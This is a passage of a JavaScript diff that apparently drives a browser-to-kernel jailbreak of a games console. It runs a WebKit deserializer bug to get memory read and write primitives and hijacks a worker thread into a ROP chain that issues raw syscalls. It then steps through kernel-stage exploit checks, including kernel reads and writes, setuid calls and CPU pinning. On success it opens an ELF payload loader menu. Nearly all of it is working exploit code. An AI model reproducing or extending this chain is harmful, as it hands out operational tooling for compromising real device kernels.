+    tr.children[1].appendChild(nm);
+    tr.children[1].appendChild(cl);
+    tr.children[2].textContent = status;
+    tr.children[2].className = "st " + status;
+
+    tr.className = "r-" + status;
+
+    const d = tr.children[3];
+    d.innerHTML = "";
+    const main = document.createElement("span");
+    main.className = status === "FAIL" ? "why" : "";
+    main.textContent = detail || "";
+    d.appendChild(main);
+    for (const n of (LOG_DEBUG ? (notes || []) : [])) {
+        const s = document.createElement("span");
+        s.className = "note";
+        s.textContent = "> " + n;
+        d.appendChild(s);
+    }
+    return tr;
+}
+
+const CARRY_PARAMS = { log: /^debug$/ };
+function carryParams(href) {
+    const keep = [];
+    for (const k of Object.keys(CARRY_PARAMS)) {
+        const v = Q.get(k);
+        if (v !== null && CARRY_PARAMS[k].test(v)) keep.push(k + "=" + v);
+    }
+    if (!keep.length) return href;
+    return href + (href.indexOf("?") >= 0 ? "&" : "?") + keep.join("&");
+}
+
+function link(href, text, kind) {
+    const a = document.createElement("a");
+    a.href = carryParams(href);
+    a.tabIndex = navLive ? -1 : 0;
+    a.textContent = text;
+    if (kind) a.className = kind;
+    navEl.appendChild(a);
+}
+
+let navLive = false;
+let runInFlight = false;
+
+function unloadBeacon(kind) {
+    try { unloadBeaconInner(kind); } catch (e) {
+        try { window.__jbRaw("UNLOAD-BEACON-THREW", (e && e.message) || e); }
+        catch { }
+    }
+}
+function unloadBeaconInner(kind) {
+    const liveSockets = engine ? engine.TW.S.n : 0;
+    const liveFds = state.fdOpen.size;
+    if (!runInFlight && !liveSockets && !liveFds && !chainDead) return;
+    flushMark("PAGE-LEFT-MID-RUN", kind + "-at=" + (currentKey || "boot")
+        + "-phase=" + (runInFlight ? "in-run" : "after-run")
+        + "-sockets=" + liveSockets
+        + "-trackedFds=" + liveFds
+        + "-triggered=" + (engine && engine.triggered ? 1 : 0)
+        + "-alias=" + (engine && engine.corrupt ? 1 : 0)
+        + "-triplet=" + (engine && engine.TW.tripletsValid() ? 1 : 0)
+        + "-chainDead=" + (chainDead ? clean(chainDead) : "no")
+        + "-latch=" + (latchState || "unknown"));
+    sendRemoteEvents(true);
+}
+window.addEventListener("pagehide", () => unloadBeacon("pagehide"));
+window.addEventListener("beforeunload", () => unloadBeacon("beforeunload"));
+
+function lockNav(live) {
+    navLive = live;
+    navEl.hidden = live;
+    navEl.style.pointerEvents = live ? "none" : "";
+    const as = navEl.getElementsByTagName("a");
+    for (let i = 0; i < as.length; ++i) as[i].tabIndex = live ? -1 : 0;
+}
+
+const WATCHDOG_MS = 15000;
+let P = null, chain = null;
+let chainDead = "";
+let syscallCount = 0;
+let errConvention = "posix";
+
+function numText(n) {
+    return "0x" + n.toString(16).toUpperCase().padStart(3, "0");
+}
+function classify(raw) {
+    const hi = raw.hi >>> 0, lo = raw.low >>> 0;
+    const failed = (hi === 0xffffffff) && (lo >= 0xfffff000);
+    return { failed, s32: lo | 0 };
+}
+function errText(res) {
+    if (!res.failed) return "ok";
+    const n = -res.s32;
+    if (errConvention === "raw") {
+        if (res.s32 === -1)
+            return "ret=-1 (ambiguous: -1 is also the POSIX failure sentinel)";
+        return "errno " + n + (ERRNO[n] ? " " + ERRNO[n] : "");
+    }
+    if (res.s32 === -1) return "ret=-1, errno set but not readable from here";
+    return "ret=" + res.s32 + " (would be " + (ERRNO[n] || ("errno " + n))
+        + " if the stubs returned -errno)";
+}
+
+function killChain(what) {
+    chainDead = what;
+    state.cleanupFailed = state.cleanupFailed || ("the ROP chain died at '"
+        + what + "'");
+    flushMark("CHAIN-DEAD", what);
+}
+
+async function watchdog(promise, what) {
+    let timer = null;
+    try {
+        return await Promise.race([
+            promise,
+            new Promise((_, rej) => {
+                timer = setTimeout(() => rej(new Error("WATCHDOG")), WATCHDOG_MS);
+            })
+        ]);
+    } catch (err) {
+        if (err && err.message === "WATCHDOG") killChain(what);
+        throw err;
+    } finally {
+        if (timer !== null) clearTimeout(timer);
+    }
+}
+
+async function sys(num, a, b, c, d, e, f) {
+    if (chainDead)
+        throw new Error("sys: the chain is unusable after '" + chainDead + "'");
+    if (Object.prototype.hasOwnProperty.call(BANNED, num))
+        throw new Error("sys: syscall " + numText(num) + " is BANNED -- "
+            + BANNED[num]);
+    if (P.syscalls[num] === undefined)
+        throw new Error("sys: " + numText(num)
+            + " has no stub in the active firmware profile");
+    syscallCount++;
+    state.syscallsIssued.add(num);
+    const t0 = Date.now();
+    const raw = await watchdog(chain.syscall(num, a, b, c, d, e, f),
+        "syscall " + numText(num));
+    state.roundTrips.push(Date.now() - t0);
+    const cl = classify(raw);
+    const res = { raw, s32: cl.s32, failed: cl.failed,
+        hex: "0x" + raw.toString(), errText: "" };
+    res.errText = errText(res);
+    return res;
+}
+
+async function runChain() {
+    if (chainDead)
+        throw new Error("runChain: the chain is unusable after '" + chainDead + "'");
+    const t0 = Date.now();
+    await watchdog(chain.run(), "chain.run");
+    state.roundTrips.push(Date.now() - t0);
+}
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+function mem(n) {
+    const ptr = P.malloc(n, 1);
+    return { ptr, u8: ptr.backing };
+}
+
+const state = {
+    syscallsIssued: new Set(),
+    roundTrips: [],
+    heapBytes: 0,
+    syncBlocks: 0, syncBytes: 0,
+    threadObjectsBuilt: 0, threadsCreated: 0, threadsExited: 0,
+    tornWrites: [],
+    groups: [],
+    fdOpen: new Set(), fdBaseline: -1,
+    cleanupFailed: ""
+};
+const track = fd => state.fdOpen.add(fd);
+const untrack = fd => state.fdOpen.delete(fd);
+let currentNotes = [];
+const note = s => {
+    currentNotes.push(s);
+    queueEvent("NOTE", (currentKey ? currentKey + "-" : "")
+        + String(s).replace(/[\r\n\t]+/g, " ")
+            .replace(/[^\x20-\x7e]/g, "").slice(0, 300));
+};
+const PASS = detail => ({ status: "PASS", detail });
+const FAIL = detail => ({ status: "FAIL", detail });
+
+const NA = detail => ({ status: "SKIP", detail });
+
+const driver = {
+    origMaskBytes: null, origMaskHex: "", origPrioType: -1, origPrio: -1,
+    core: -1, coreWhy: "", tid: 0, pid: 0, pinned: false,
+
+    prioChanged: false, affChanged: false
+};
+
+const nogcHard = { carrier: null, p: null, chain: null };
+
+async function preflight() {
+    if (typeof prepare !== "function")
+        throw new Error("main.js did not evaluate -- `prepare` is undefined.");
+    if (typeof worker_rop !== "function")
+        throw new Error("rop.js did not evaluate -- `worker_rop` is undefined");
+    if (typeof SYS_GETPID === "undefined")
+        throw new Error("syscalls.js did not evaluate -- SYS_GETPID is undefined");
+
+    await window.offsetsReady;
+    flushMark("OFFSETS-READY", "fw=" + window.fw_str
+        + "-gadgets=" + Object.keys(wk_gadgetmap).length
+        + "-syscalls=" + Object.keys(syscall_map).length);
+
+    if (!wk_gadgetmap || !Object.keys(wk_gadgetmap).length
+        || !syscall_map || !Object.keys(syscall_map).length)
+        throw new Error("../offsets/" + window.fw_str + ".js loaded but is empty: "
+            + Object.keys(wk_gadgetmap || {}).length + " gadgets, "
+            + Object.keys(syscall_map || {}).length + " syscalls.");
+
+    let verdict = "ok";
+    try {
+        const r = await fetch("rop_slave.js?v=lowfw17", { cache: "no-store" });
+        if (!r.ok) verdict = "http-" + r.status;
+    } catch (err) { verdict = "fetch-threw"; }
+    if (verdict === "ok") {
+        let w = null;
+        verdict = await new Promise(resolve => {
+            let done = false;
+            const finish = v => {
+                if (done) return;
+                done = true;
+                try { if (w) w.terminate(); } catch { }
+                resolve(v);
+            };
+            const t = setTimeout(() => finish("timeout"), 4000);
+            try {
+                w = new Worker("rop_slave.js?v=lowfw17");
+                w.onmessage = () => { clearTimeout(t); finish("ok"); };
+                w.onerror = () => { clearTimeout(t); finish("worker-error"); };
+                w.postMessage(0);
+            } catch (err) { clearTimeout(t); finish("worker-threw"); }
+        });
+    }
+    flushMark("WORKER-PROBE", verdict);
+    if (verdict !== "ok")
+        throw new Error("rop_slave.js is not usable (" + verdict + ")");
+}
+
+function assertInt64Identity() {
+    if (globalThis.int64 !== int64)
+        throw new Error("int64: two constructors in the page");
+    flushMark("INT64-IDENTITY-OK", "");
+}
+
+function assertBases() {
+    const named = [
+        ["wk", P.libSceNKWebKitBase],
+        ["lc", P.libSceLibcInternalBase],
+        ["lk", P.libKernelBase]
+    ];
+    const parts = [];
+    for (const [n, b] of named) {
+        flushMark("BASE-PRE", n + "=0x" + b.toString() + "-check=band+align");
+        if ((b.low & 0x3fff) !== 0)
+            throw new Error(n + " base 0x" + b.toString() + " is not aligned");
+        if ((b.hi >>> 0) !== 8)
+            throw new Error(n + " base 0x" + b.toString() + " is outside the band");
+        parts.push(n + "=0x" + b.toString());
+    }
+    flushMark("BASES", parts.join("-") + "-band=ok-align=0x4000");
+    if (typeof OFFSET_wk___stack_chk_guard_import === "number"
+        && typeof OFFSET_lk___stack_chk_guard === "number") {
+        const slot = P.libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import);
+        flushMark("BASE-XCHECK-PRE", "slot=0x" + slot.toString() + "-next=read8");
+        const seen = P.read8(slot);
+        const derived = seen.sub32(OFFSET_lk___stack_chk_guard);
+        const agree = derived.low === P.libKernelBase.low
+            && derived.hi === P.libKernelBase.hi;
+        flushMark("BASE-XCHECK", "derived-lk=0x" + derived.toString()
+            + "-prepare-lk=0x" + P.libKernelBase.toString() + "-agree=" + agree);
+        if (!agree)
+            throw new Error("libkernel base disagreement");
+    }
+}
+
+async function probeErrnoConvention() {
+    const r = await sys(0x006, 0x7fffffff);
+    if (r.failed && r.s32 === -1) errConvention = "posix";
+    else if (r.failed) errConvention = "raw";
+    else errConvention = "unknown";
+    flushMark("ERRNO-CONVENTION", errConvention + "-ret=" + r.s32);
+}
+
+const REFERENCE_CHAIN_ENTRY = "run_" + "ps" + "free";
+function refuseReferenceChain() {
+    if (typeof window[REFERENCE_CHAIN_ENTRY] === "function") {
+        flushMark("REFERENCE-CHAIN-PRESENT-REFUSING", REFERENCE_CHAIN_ENTRY);
+        stage("refusing to run -- the reference chain's entry point is loaded",
+            "bad");
+        throw new Error("the reference chain's entry point is present");
+    }
+    flushMark("REFERENCE-CHAIN-ABSENT", "only-poopsploit-can-satisfy-this-page");
+}
+
+async function chooseCore() {
+    const m = mem(K.CPUSET_SIZE);
+    for (let i = 0; i < K.CPUSET_SIZE; ++i) m.u8[i] = 0;
+    flushMark("INHERITED-MASK-PRE", "syscall=cpuset_getaffinity-0x1E7-buf=0x"
+        + m.ptr.toString());
+    const r = await sys(0x1E7, K.CPU_LEVEL_WHICH, K.CPU_WHICH_TID,
+        new int64(0xffffffff, 0xffffffff), K.CPUSET_SIZE, m.ptr);
+    if (r.failed)
+        throw new Error("cpuset_getaffinity failed (" + r.errText
+            + "). Refusing to pin anything blind.");
+    const bytes = new Uint8Array(K.CPUSET_SIZE);
+    for (let i = 0; i < K.CPUSET_SIZE; ++i) bytes[i] = m.u8[i];
+    const word = r32(bytes, 0);
+    driver.origMaskBytes = bytes;
+    driver.origMaskHex = hexBytes(bytes, 0, K.CPUSET_SIZE);
+    flushMark("INHERITED-MASK", "mask=0x" + word.toString(16) + "-cores="
+        + coreList(word) + "-bytes=" + driver.origMaskHex);
+    if (word === 0)
+        throw new Error("the inherited affinity mask is 0");
+    let core = -1;
+    if (CORE_OVERRIDE >= 0) {
+        if (CORE_OVERRIDE > 15 || ((word >>> CORE_OVERRIDE) & 1) === 0)
+            throw new Error("?core=" + CORE_OVERRIDE + " is not set in the "
+                + "inherited mask 0x" + word.toString(16) + " (available: "
+                + coreList(word) + "). cpuset_setaffinity would fail and every "
+                + "test below would still appear to work.");
+        core = CORE_OVERRIDE;
+        driver.coreWhy = "chosen explicitly with ?core=" + CORE_OVERRIDE
+            + " and confirmed present in the inherited mask";
+    } else {
+        for (let i = 15; i >= 0; --i) if ((word >>> i) & 1) { core = i; break; }
+        driver.coreWhy = "the highest core set in the INHERITED mask 0x"
+            + word.toString(16) + " (available: " + coreList(word) + "). "
+            + "Derived, not hardcoded: poops.c:52 uses 5 and p2jb.js:193 uses "
+            + "4, and neither exists here.";
+    }
+    if (core < 0 || core > 15)
+        throw new Error("no usable core in 0..15 from mask 0x" + word.toString(16));
+    driver.core = core;
+    flushMark("CORE-CHOSEN", "core=" + core);
+    return core;
+}
+
+let engine = null;
+let LADDER = [];
+let currentKey = "";
+let ctx = null;
+
+function makeContext() {
+    ctx = {
+        P, chain, i64: (lo, hi) => new int64(lo, hi),
+        sys, runChain, mem, flushMark, queueEvent, sleep, note, PASS, FAIL, NA,
+        track, untrack, state, cfg, latch, stage, driver,
+        WATCHDOG_MS, setChainMarksQuiet,
+
+        setRaceMode, repaintScreen,
+
+        markStats, flushQueue, verdictBanner,
+        chainDeadNow: () => !!chainDead,
+        measured: {},
+        stalledAt: STALLED_AT, lastRun: LAST_RUN,
+        filteredRun: FILTERED_RUN, only: ONLY.slice(), from: FROM
+    };
+    engine = makePoopsEngine(ctx);
+    engine.setFamily(cfg.trigger);
+    return ctx;
+}
+
+let cleanupClaimed = false;
+
+async function runLadder() {
+    const X = ctx;
+    LADDER = buildLadder(X, engine);
+
+    let passed = 0, failed = 0, skipped = 0, filtered = 0;
+    let started = false, aborted = "";
+
+    for (let i = 0; i < LADDER.length; ++i)
+        row(i + 1, LADDER[i], "SKIP", "queued");
+
+    for (let i = 0; i < LADDER.length; ++i) {
+        const entry = LADDER[i];
+
+        if (entry.key === "ps7_report") continue;
+        if (ONLY.length && ONLY.indexOf(entry.key) < 0) {
+            filtered++;
+            row(i + 1, entry, "SKIP", "not in ?only=");
+            continue;
+        }
+        if (!ONLY.length && FROM && !started) {
+            if (entry.key !== FROM) {
+                filtered++;
+                row(i + 1, entry, "SKIP", "before ?from=" + FROM);
+                continue;
+            }
+            started = true;
+        }
+        if (state.cleanupFailed) {
+            skipped++;
+            row(i + 1, entry, "SKIP", "REFUSED -- an earlier step could not "
+                + "clean up: " + state.cleanupFailed);
+            continue;
+        }
+        if (chainDead) {
+            skipped++;
+            row(i + 1, entry, "SKIP", "chain unusable after '" + chainDead
+                + "'. Even the teardown is a chain round trip.");
+            continue;
+        }
+
+        storeSet(PROGRESS_KEY, entry.key);
+        currentKey = entry.key;
+        currentNotes = [];
+        row(i + 1, entry, "RUN", "running...");
+        flushMark("TEST-ENTER", entry.key
+            + (entry.hot ? "-chainMarks=queued" : "-chainMarks=blocking"));
+        let result;
+        const wasQuiet = setChainMarksQuiet(!!entry.hot);
+        try {
+            result = await entry.run();
+            if (!result) result = FAIL("the test returned nothing");
+        } catch (err) {
+            const m = (err && err.message) || String(err);
+            if (m === "WATCHDOG") {
+                aborted = entry.key;
+                result = FAIL("WATCHDOG: no reply from the ROP worker in "
+                    + WATCHDOG_MS + " ms. launch_chain has no timeout of its "
+                    + "own (main.js:393-399).");
+            } else {
+                result = FAIL("THREW " + (err && err.name) + ": " + m.slice(0, 400));
+            }
+        } finally {
+            setChainMarksQuiet(wasQuiet);
+        }
+        if (result.status === "PASS") passed++;
+        else if (result.status === "SKIP") skipped++;
+        else failed++;
+        row(i + 1, entry, result.status, result.detail, currentNotes);
+        flushMark("TEST", entry.key + "-" + result.status
+            + (result.detail
+                ? "-why=" + String(result.detail).replace(/[\r\n\t]+/g, " ")
+                    .replace(/[^\x20-\x7e]/g, "").slice(0, 400)
+                : ""));
+        if (state.cleanupFailed) danger("cleanup failure: " + state.cleanupFailed);
+
+        if (aborted || result.status === "FAIL") {
+            if (!aborted) aborted = entry.key + " (FAIL)";
+            for (let k = i + 1; k < LADDER.length; ++k) {
+                if (LADDER[k].key === "ps7_report") continue;
+                skipped++;
+                row(k + 1, LADDER[k], "SKIP", "REFUSED after '" + entry.key
+                    + "' failed");
+            }
+            break;
+        }
+    }
+
+    let reportRow = null;
+    for (const e of LADDER) if (e.key === "ps7_report") reportRow = e;
+    const reportIdx = reportRow ? LADDER.indexOf(reportRow) + 1 : 0;
+    let reportResult = null;
+    if (reportRow && chainDead) {
+        skipped++;
+        row(reportIdx, reportRow, "SKIP", "IMPOSSIBLE -- the chain died at '"
+            + chainDead + "'");
+    } else if (reportRow && !engine) {
+        skipped++;
+        row(reportIdx, reportRow, "SKIP", "no engine was built");
+    } else if (reportRow && !cleanupClaimed) {
+        cleanupClaimed = true;
+        currentKey = "ps7_report";
+        currentNotes = [];
+        flushMark("TEST-ENTER", "ps7_report-forced");
+        try {
+            reportResult = await reportRow.run();
+        } catch (err) {
+            reportResult = FAIL("PS7 THREW: " + ((err && err.message) || err));
+        }
+        row(reportIdx, reportRow, reportResult.status, reportResult.detail,
+            currentNotes);
+        if (reportResult.status === "PASS") passed++; else failed++;
+        flushMark("TEST", "ps7_report-" + reportResult.status);
+    }
+
+    let stranded = [];
+    const noClose = (engine && engine.S && engine.S.doNotClose)
+        ? engine.S.doNotClose : new Set();
+    const sweepBlocked = engine && engine.corrupt ? "alias-present"
+        : (engine && engine.triggered ? "trigger-fired"
+            : (chainDead ? "chain-dead"
+                : (state.cleanupFailed ? "cleanup-failed"
+                    : ((engine && engine.S && engine.S.groupsStillLive.length)
+                        ? "racer-group-still-parked" : ""))));
+    const sweepable = Array.from(state.fdOpen).filter(fd => !noClose.has(fd));
+    if (sweepable.length && !sweepBlocked) {
+        for (const fd of sweepable) {
+            try { await sys(0x006, fd); } catch { }
+            state.fdOpen.delete(fd);
+        }
+        flushMark("FD-SWEEP", "closed=" + sweepable.length + "-skipped="
+            + noClose.size + "-fds=" + sweepable.slice(0, 24).join("."));
+    } else if (sweepable.length) {
+        flushMark("FD-STRANDED", "n=" + sweepable.length + "-why=" + sweepBlocked
+            + "-fds=" + sweepable.slice(0, 24).join("."));
+    }
+
+    const strandSet = new Set(noClose);
+    for (const fd of state.fdOpen) strandSet.add(fd);
+    stranded = Array.from(strandSet);
+    if (noClose.size)
+        flushMark("FD-DO-NOT-CLOSE", "n=" + noClose.size + "-fds="
+            + Array.from(noClose).slice(0, 24).join("."));
+
+    currentKey = "";
+
+    const rt = state.roundTrips;
+    const rtMean = rt.length
+        ? Math.round(rt.reduce((a, b) => a + b, 0) / rt.length * 10) / 10 : -1;
+    const rtMax = rt.length ? Math.max.apply(null, rt) : -1;
+
+    tallyEl.textContent = passed + " PASS   " + failed + " FAIL   "
+        + skipped + " SKIP" + (filtered ? "   " + filtered + " FILTERED" : "");
+    tallyEl.style.color = failed ? "#e05561" : "#47c76a";
+
+    const v = (ctx.measured && ctx.measured.verdict) || null;
+    const mustReboot = v ? !!v.reboot : true;
+    const lines = [];
+    lines.push("rows: " + LADDER.length + " = " + passed + " pass + " + failed
+        + " fail + " + skipped + " skip + " + filtered + " filtered");
+    if (engine) {
+        lines.push("TRIGGER: " + cfg.trigger
+            + (cfg.trigger === "overflow" ? " (burn=" + cfg.burn + ")" : "")
+            + "   |   fired: " + (engine.triggered ? "YES -- " + engine.triggered
+                : "no")
+            + "   |   alias observed: " + (engine.corrupt ? "YES" : "no")
+            + "   |   triplet: " + (engine.TW.tripletsValid()
+                ? engine.TW.S.triplets.join(",") : "none"));
+        lines.push("crfrees issued: " + engine.S.crfrees
+            + "   |   setuid(1) calls: " + engine.S.setuidCalls
+            + "   |   kread_slow: " + engine.S.kreadOk + " ok of "
+            + engine.S.kreadCalls
+            + "   |   kqueues opened/closed: " + engine.S.kqueuesOpened + "/"
+            + engine.S.kqueuesClosed
+            + "   |   kernel writes: " + engine.kernelWrites);
+        if (engine.S.masterPipeData)
+            lines.push("STAGE 2 OUTPUT: master_pipe and victim_pipe are retained "
+                + "in this process as Stage 3 input; values are shown in the PS6 "
+                + "row and telemetry.");
+    }
+    if (ctx && ctx.measured.rt)
+        lines.push("MEASURED chain.run(): " + ctx.measured.rt.a.toFixed(2)
+            + " ms fixed + " + (ctx.measured.rt.b * 1000).toFixed(1)
+            + " us per in-chain syscall.");
+    if (ctx && ctx.measured.stage0)
+        lines.push("STAGE 0: " + ctx.measured.stage0.attempts + " attempts in "
+            + ctx.measured.stage0.ms + " ms = "
+            + (ctx.measured.stage0.ms
+                / Math.max(1, ctx.measured.stage0.attempts)).toFixed(0)
+            + " ms/attempt.");
+    lines.push("chain round trips: " + rt.length + ", mean " + rtMean
+        + " ms, worst " + rtMax + " ms; one-at-a-time syscalls " + syscallCount
+        + "; errno convention (measured): " + errConvention);
+    lines.push("threads: " + state.threadsCreated + " created, "
+        + state.threadsExited + " confirmed exited"
+        + (state.tornWrites.length
+            ? "; torn slot writes: " + state.tornWrites.join(",") : ""));
+    if (stranded.length)
+        lines.push("descriptors left open on purpose ("
+            + (sweepBlocked ? "sweep blocked: " + sweepBlocked + "; " : "")
+            + noClose.size + " named by cleanup as do-not-close, "
+            + state.fdOpen.size + " still tracked): "
+            + stranded.join(",") + "");
+    if (aborted) lines.push("run stopped at '" + aborted + "'.");
+    if (FILTERED_RUN)
+        lines.push("this was A filtered pass ("
+            + (ONLY.length ? "?only=" + ONLY.join(",") : "?from=" + FROM)
+            + "). It can only account for what IT did.");
+    summaryEl.textContent = lines.join("\n");
+
+    flushMark("POOPS-COMPLETE", "pass=" + passed + "-fail=" + failed
+        + "-skip=" + skipped + "-reboot=" + (mustReboot ? 1 : 0)
+        + "-triggered=" + (engine && engine.triggered ? 1 : 0)
+        + "-rtmean=" + rtMean + "-filtered=" + (FILTERED_RUN ? 1 : 0));
+
+    const payloadSuccess = cfg.payload === "1" && elfldrSpawned;
+    const fullSuccess = payloadSuccess || (failed === 0 && !aborted
+        && !FILTERED_RUN && !chainDead && !state.cleanupFailed);
+
+    if (fullSuccess) {
+        clearFailureBanners();
+        setCatResult(true);
+        showVerdict(false, payloadSuccess
+            ? "ELF LOADER READY -- returning to the payload menu."
+            : "SUCCESS -- all executed checks passed."
+                + (mustReboot
+                    ? "\n\nThe jailbreak changed this boot's kernel state; reboot before running it again."
+                    : "\n\nCleanup completed and the run may be repeated safely."));
+    } else if (mustReboot) {
+        setCatResult(false);
+        showVerdict(true, (v ? v.text : "reboot now -- the state report and "
+            + "cleanup row (PS7) never ran"
+            + (chainDead ? ", because the ROP chain died at '" + chainDead
+                + "'"
+                : ", so nothing has been verified and this page cannot claim "
+                + "anything was put back."))
+            + "\n\nREBOOT NOW"
+            + (v && v.all.length > 1
+                ? "\n\nAll reasons:\n  - " + v.all.join("\n  - ") : ""));
+    } else {
+
+        const ver = (v && v.verified) || {};
+        setCatResult(false);
+        showVerdict(false, "you are fine -- nothing was triggered and " + "everything this page can check was put back.\n"
+            + (ver.teardown ? "freed and closed socket by socket"
+                : "teardown had nothing to do")
+            + "; racers " + (ver.racers ? "confirmed exited" : "NOT confirmed")
+            + "; scheduler affinity "
+            + (ver.schedAff ? "read back" : "NOT read back")
+            + " and priority " + (ver.schedPrio ? "read back" : "NOT read back")
+            + "; descriptors left open on purpose: " + stranded.length
+            + "; kernel writes: " + (ver.kernelWrites === undefined
+                ? "0" : ver.kernelWrites) + ".");
+    }
+
+    const finalLatch = await latch.read();
+    if (!mustReboot && !failed && !aborted && !FILTERED_RUN && !stranded.length
+        && !chainDead && !state.cleanupFailed) {
+        const l = await latch.clear();
+        flushMark("LATCH-RELEASED", "set=" + (l.set ? 1 : 0));
+        lines.push("one-shot latch RELEASED: this run put everything back and "
+            + "verified it.");
+    } else {
+        flushMark("LATCH-HELD", "reboot=" + mustReboot + "-failed=" + failed
+            + "-aborted=" + (aborted || "no") + "-filtered=" + FILTERED_RUN);
+        lines.push("ONE-shot latch still held"
+            + (finalLatch.set ? "" : " (or never took)")
+            + "");
+    }
+    summaryEl.textContent = lines.join("\n");
+
+    if (!aborted && !FILTERED_RUN) storeDel(PROGRESS_KEY);
+    storeSet(RUNLOG_KEY, JSON.stringify({
+        v: 1, rev: REV, fw: window.fw_str, ts: Date.now(),
+        trigger: cfg.trigger, burn: cfg.burn, payload: cfg.payload,
+        checkpoint: CHECKPOINT,
+        proof: PROOF, only: ONLY.join(","),
+        stoppedAt: aborted || "", filtered: FILTERED_RUN,
+        pass: passed, fail: failed, skip: skipped,
+        reboot: mustReboot,
+        triggered: engine ? engine.triggered : "",
+        corrupt: engine ? engine.corrupt : "",
+        triplets: engine && engine.TW.tripletsValid()
+            ? engine.TW.S.triplets.join(",") : "",
+        setuidCalls: engine ? engine.S.setuidCalls : 0,
+        kernelWrites: engine ? engine.kernelWrites : 0,
+        socketsLeft: engine ? engine.TW.S.n : 0,
+        chainDead: chainDead, cleanupFailed: state.cleanupFailed,
+        latchDetail: (finalLatch && finalLatch.detail) || ""
+    }));
+
+    if (payloadSuccess)
+        stage("ELF LOADER READY -- opening payload menu", "ok");
+    else if (fullSuccess)
+        stage("SUCCESS -- " + passed + " PASS / 0 FAIL", "ok");
+    else if (mustReboot)
+        stage("reboot required -- " + passed + " PASS / " + failed + " FAIL", "bad");
+    else if (failed || aborted)
+        stage("FAILED -- " + passed + " PASS / " + failed + " FAIL", "bad");
+    else
+        stage("selected stages complete, nothing triggered, everything put back -- "
+            + passed + " PASS", "ok");
+
+    if (payloadSuccess) {
+        flushMark("ELFLDR-MENU-INPAGE",
+            "no-navigation-parked-racers-and-fds-remain-owned-port=9021");
+        if (!payloadMenuEl.classList.contains("on")) showPayloadMenu();
+    }
+}
+
+let bootChainReady = false;
+
+async function bootChain() {
+    const bootTimer = setTimeout(() => {
+        flushMark("BOOT-STALLED", "ms=45000-stage=boot-nothing-changed-yet");
+        stage("boot is taking more than 45 s");
+    }, 45000);
+    try {
+        stage("preflight");
+        await preflight();
+        refuseReferenceChain();
+        await bootPrimitiveAndChain();
+        bootChainReady = true;
+    } finally {
+        clearTimeout(bootTimer);
+    }
+}
+
+async function bootPrimitiveAndChain() {
+    if (globalThis.p && typeof globalThis.p.read8 === "function") {
+        flushMark("PRIMITIVE-REUSED", "window.p was already published");
+    } else if (typeof window.jbReady === "object" && window.jbReady !== null
+        && typeof window.jbReady.then === "function") {
+        stage("waiting for the primitive");
+        await window.jbReady;
+        flushMark("PRIMITIVE-REUSED", "via-window.jbReady");
+    } else if (typeof window.run_poopsploit === "function") {
+        stage("running poopsploit's deserializer bug through window.run_poopsploit");
+        await window.run_poopsploit(window.fw_str);
+        flushMark("PRIMITIVE-REUSED", "via-window.run_poopsploit");
+    } else {
+        stage("running the webkit bug -- placement is ~1 attempt in 3, it "
+            + "retries itself");
+
+        // A killed/reloaded WebProcess can restore this history entry with the
+        // previous 65k-object SerializedScriptValue graph still attached.  If
+        // we build the next graph before releasing it, 9.00 can hit its memory
+        // ceiling almost immediately.  Purge it before any exploit allocation.
+        flushMark("PRIMITIVE-HISTORY-PURGE-PRE", "replace-state-null");
+        try {
+            history.replaceState(null, "");
+        } catch (e) {
+            flushMark("PRIMITIVE-HISTORY-PURGE-FAIL",
+                (e && e.name ? e.name : "Error") + ":" + String(e && e.message || e));
+            throw e;
+        }
+        if (typeof globalThis.gc === "function") {
+            try { globalThis.gc(); } catch (e) { }
+        }
+        await new Promise(resolve => setTimeout(resolve, 750));
+        flushMark("PRIMITIVE-HISTORY-PURGED", "settled-ms=750");
+
+        const carrier = await establishPrimitive({
+            maxAttempts: MAX_ATTEMPTS,
+            onEvent(tag, detail, attempt) {
+                if (tag === "ATTEMPT-START") {
+                    // This is before the large graph is built, so make the
+                    // checkpoint durable if the WebProcess dies during setup.
+                    flushMark(tag, detail);
+                    stage("exploit attempt " + attempt + " -- waiting for placement");
+                } else {
+                    queueEvent(tag, detail);
+                }
+            },
+            beforeCriticalLoad(fake, target) {
+                queueEvent("CRITICAL-LOAD-NEXT", "fake=0x" + fake.toString(16)
+                    + "-target=0x" + target.toString(16));
+                void scrEl.offsetWidth;
+                flushQueue(false);
+            }
+        });
+        nogcHard.carrier = carrier;
+        installWindowP(carrier, { onEvent: queueEvent });
+        // installWindowP() promotes the primitive to a self-contained pair of
+        // real typed arrays.  Keeping the obsolete fake carrier here defeats
+        // core.js's release and can retain the 72 MB addrof carrier graph.
+        nogcHard.carrier = null;
+        if (typeof globalThis.gc === "function") {
+            try { globalThis.gc(); } catch (e) { }
+        }
+        // Give JSC an idle turn to reclaim the released carrier/groom before
+        // prepare() creates its worker ROP stack and the kernel-stage arenas.
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        flushMark("PRIMITIVE-MEMORY-RELIEF",
+            "fake-carrier-dropped=1-history-state-null="
+            + (history.state === null));
+        // The landing page preloads the small UI image so it remains visually
+        // stable while this page transitions into its live log view.
+        flushMark("PRIMITIVE-UP", "attempt=" + carrier.attempts
+            + "-paired=" + pairStatus.promoted
+            + "-released=" + fakeCellReleased());
+        if (!pairStatus.promoted)
+            throw new Error("the (main, worker) pair was NOT promoted ("
+                + pairStatus.error + ")");
+    }
+
+    const p = globalThis.p;
+    if (!p || typeof p.read8 !== "function")
+        throw new Error("window.p was never published");
+    nogcHard.p = p;
+    assertInt64Identity();
+
+    stage("loading poops_lib / threads_lib / twin_lib / poops_stages");
+    await loadPoopsModules();
+
+    const handoff = window.jbPrepared || null;
+    let prepared;
+    if (handoff && handoff.chain && handoff.p
+        && typeof handoff.chain.syscall === "function"
+        && handoff.p.syscalls !== undefined) {
+        prepared = handoff;
+        flushMark("CHAIN-REUSED", "window.jbPrepared");
+    } else {
+        stage("prepare(): module bases, gadget/syscall tables, worker hijack");
+        flushMark("PREP-ENTER", "");
+        prepared = await prepare(p);
+        flushMark("PREP-OK", "getpid-passed-inside-prepare");
+    }
+    P = prepared.p;
+    chain = prepared.chain;
+    nogcHard.chain = chain;
+
+    flushMark("POST-PREP", "next=assertBases");
+    assertBases();
+    await probeErrnoConvention();
+}
+
+async function main() {
+    flushMark("POOPS-BOOT", "rev=" + REV + "-trigger=" + cfg.trigger
+        + "-burn=" + cfg.burn + "-sockets=" + cfg.sockets
+        + "-attempts=" + cfg.attempts + "-from=" + (FROM || "none")
+        + "-only=" + (ONLY.join(".") || "none")
